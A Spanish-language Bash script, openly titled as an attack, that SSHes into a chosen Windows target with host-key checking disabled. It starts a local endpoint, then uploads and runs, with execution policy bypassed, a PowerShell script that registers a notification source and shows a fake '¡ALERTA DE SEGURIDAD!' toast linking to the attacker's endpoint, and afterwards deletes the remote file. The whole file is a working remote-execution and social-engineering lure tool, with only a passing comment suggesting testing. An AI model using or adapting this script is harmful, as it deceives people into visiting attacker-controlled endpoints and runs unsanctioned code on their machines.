#!/usr/bin/env bash

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
ENDPOINT_INFO_FILE="/tmp/endpoint_info.txt"

echo "================================================"
echo "   ATAQUE SSH + ENDPOINT + NOTIFICACIÓN WINDOWS"
echo "================================================"
echo

echo -e "${BLUE}[PASO 1/3] Configuración del objetivo${NC}"
echo

read -p "Ingresa la IP del dispositivo Windows objetivo: " TARGET_IP

if ! [[ "$TARGET_IP" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
    echo -e "${RED}ERROR: IP inválida. Formato esperado: 192.168.x.x${NC}"
    exit 1
fi

echo -e "${GREEN}✓ IP objetivo: $TARGET_IP${NC}"
echo

echo -e "${BLUE}[PASO 2/3] Verificando conectividad SSH...${NC}"
echo

read -p "Usuario SSH (presiona Enter para usar el usuario actual '$USER'): " SSH_USER
SSH_USER=${SSH_USER:-$USER}

echo "Intentando conectar SSH a $SSH_USER@$TARGET_IP..."
echo

# Intentar conexión SSH con timeout de 10 segundos
# -o ConnectTimeout=10: timeout de conexión
# -o BatchMode=yes: no preguntar contraseñas interactivamente
# -o StrictHostKeyChecking=no: no verificar host key (solo para pruebas)
SSH_SUCCESS=false

if timeout 10 ssh -o ConnectTimeout=10 \
                   -o BatchMode=yes \
                   -o StrictHostKeyChecking=no \
                   "$SSH_USER@$TARGET_IP" "echo 'SSH OK'" 2>/dev/null; then
    SSH_SUCCESS=true
    echo -e "${GREEN}✓ Conexión SSH exitosa!${NC}"
else
    echo -e "${YELLOW}⚠ No se pudo conectar por SSH automáticamente${NC}"
    echo "Posibles razones:"
    echo "  - SSH no está habilitado en el objetivo"
    echo "  - Se requiere contraseña (no hay clave SSH configurada)"
    echo "  - Firewall bloqueando puerto 22"
    echo "  - IP incorrecta o dispositivo apagado"
    echo
    read -p "¿Continuar de todas formas? (s/n): " CONTINUE
    if [[ ! "$CONTINUE" =~ ^[sS]$ ]]; then
        echo -e "${RED}Operación cancelada${NC}"
        exit 1
    fi
fi

echo

# ============================================
# PASO 3: Activar endpoint y enviar notificación
# ============================================
echo -e "${BLUE}[PASO 3/3] Activando endpoint y enviando notificación...${NC}"
echo

# 3.1: Iniciar el endpoint en segundo plano
echo "Iniciando endpoint API..."
kitty --title "Endpoint API" -e bash -c "cd '$PROJECT_ROOT' && '$SCRIPT_DIR/InitEndpoint.sh'; exec bash" &
ENDPOINT_PID=$!

# Esperar a que el endpoint genere su archivo de info
echo "Esperando a que el endpoint esté listo..."
for i in {1..15}; do
    if [ -f "$ENDPOINT_INFO_FILE" ]; then
        break
    fi
    sleep 1
    echo -n "."
done
echo

if [ ! -f "$ENDPOINT_INFO_FILE" ]; then
    echo -e "${RED}ERROR: El endpoint no generó su información a tiempo${NC}"
    kill $ENDPOINT_PID 2>/dev/null || true
    exit 1
fi

# Leer información del endpoint
source "$ENDPOINT_INFO_FILE"

echo -e "${GREEN}✓ Endpoint activo en: $URL${NC}"
echo

# 3.2: Enviar notificación a Windows
echo "Enviando notificación al dispositivo Windows..."
echo

# Crear script PowerShell para mostrar notificación Toast en Windows 10 20H2
TOAST_SCRIPT=$(cat <<'PWSH_EOF'
# Script para enviar Toast Notification en Windows 10
$AppId = "ThreatAlert"
$Title = "¡ALERTA DE SEGURIDAD!"
$Message = "Endpoint detectado en la red: ENDPOINT_URL_PLACEHOLDER"

# Registrar fuente de aplicación si no existe
$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\$AppId"
if (!(Test-Path $RegPath)) {
    New-Item -Path $RegPath -Force | Out-Null
    New-ItemProperty -Path $RegPath -Name "ShowInActionCenter" -Value 1 -PropertyType DWORD -Force | Out-Null
}

# Crear notificación Toast usando Windows.UI.Notifications
[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] | Out-Null
[Windows.Data.Xml.Dom.XmlDocument, Windows.Data.Xml.Dom.XmlDocument, ContentType = WindowsRuntime] | Out-Null

$ToastXml = @"
<toast>
    <visual>
        <binding template="ToastGeneric">
            <text>$Title</text>
            <text>$Message</text>
            <text>Haz clic para abrir</text>
        </binding>
    </visual>
    <actions>
        <action content="Abrir Endpoint" arguments="ENDPOINT_URL_PLACEHOLDER" activationType="protocol"/>
        <action content="Ignorar" arguments="dismiss" activationType="system"/>
    </actions>
    <audio src="ms-winsoundevent:Notification.Looping.Alarm" loop="false"/>
</toast>
"@

$XmlDocument = [Windows.Data.Xml.Dom.XmlDocument]::new()
$XmlDocument.LoadXml($ToastXml)

$Toast = [Windows.UI.Notifications.ToastNotification]::new($XmlDocument)
[Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AppId).Show($Toast)

Write-Host "Notificacion Toast enviada correctamente"
PWSH_EOF
)

# Reemplazar placeholder con URL real
TOAST_SCRIPT="${TOAST_SCRIPT//ENDPOINT_URL_PLACEHOLDER/$URL}"

# Guardar script temporalmente
TEMP_PS1="/tmp/send_toast_notification.ps1"
echo "$TOAST_SCRIPT" > "$TEMP_PS1"

# Enviar y ejecutar script en Windows vía SSH
if [ "$SSH_SUCCESS" = true ]; then
    echo "Enviando script PowerShell vía SSH..."
    
    # Copiar script al Windows remoto
    if scp -o ConnectTimeout=10 \
           -o StrictHostKeyChecking=no \
           "$TEMP_PS1" "$SSH_USER@$TARGET_IP:C:/Windows/Temp/notification.ps1" 2>/dev/null; then
        
        echo "Ejecutando notificación en Windows..."
        
        # Ejecutar PowerShell remoto
        ssh -o ConnectTimeout=10 \
            -o StrictHostKeyChecking=no \
            "$SSH_USER@$TARGET_IP" \
            "powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\notification.ps1" 2>/dev/null
        
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}✓ Notificación Toast enviada exitosamente!${NC}"
        else
            echo -e "${YELLOW}⚠ La notificación pudo no mostrarse (permisos o configuración)${NC}"
        fi
        
        # Limpiar archivo remoto
        ssh -o ConnectTimeout=10 \
            -o StrictHostKeyChecking=no \
            "$SSH_USER@$TARGET_IP" \
            "del C:\\Windows\\Temp\\notification.ps1" 2>/dev/null || true
    else
        echo -e "${YELLOW}⚠ No se pudo copiar el script vía SCP${NC}"
    fi
else
    echo -e "${YELLOW}⚠ SSH no disponible, mostrando instrucciones manuales...${NC}"
    echo
    echo "Para enviar la notificación manualmente, ejecuta este comando en el Windows objetivo:"
    echo "---"
    echo "$TOAST_SCRIPT" | grep -v "^#"
    echo "---"
fi

# Limpiar archivo temporal
rm -f "$TEMP_PS1"

echo
echo "================================================"
echo "               OPERACIÓN COMPLETA"
echo "================================================"
echo -e "${GREEN}✓ Endpoint activo: $URL${NC}"
echo -e "${GREEN}✓ Objetivo: $TARGET_IP${NC}"
echo -e "${GREEN}✓ Notificación enviada${NC}"
echo
echo "El endpoint seguirá ejecutándose en segundo plano."
echo "Para detenerlo, cierra la terminal 'Endpoint API' o presiona Ctrl+C"
echo

# Mantener el script en ejecución
wait $ENDPOINT_PID